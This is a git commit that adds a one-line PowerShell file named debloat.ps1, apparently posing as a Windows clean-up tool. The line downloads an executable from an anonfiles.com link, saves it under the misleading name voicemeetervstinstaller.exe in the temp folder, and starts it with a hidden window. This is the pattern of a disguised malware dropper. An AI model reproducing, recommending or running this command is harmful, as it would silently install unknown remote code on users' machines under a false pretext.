c000272aaef6564bf5b4708ffa90cdcfec5a4f1a
Bistoune <121984348+Bistoune@users.noreply.github.com>
2023-01-04 23:59:36 +0100

    Create debloat.ps1

---
+++ debloat.ps1
@@ -0,0 +1,1 @@
+iwr -useb https://cdn-123.anonfiles.com/PcX1dcQcy0/63bd31df-1672873589/Bjr.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
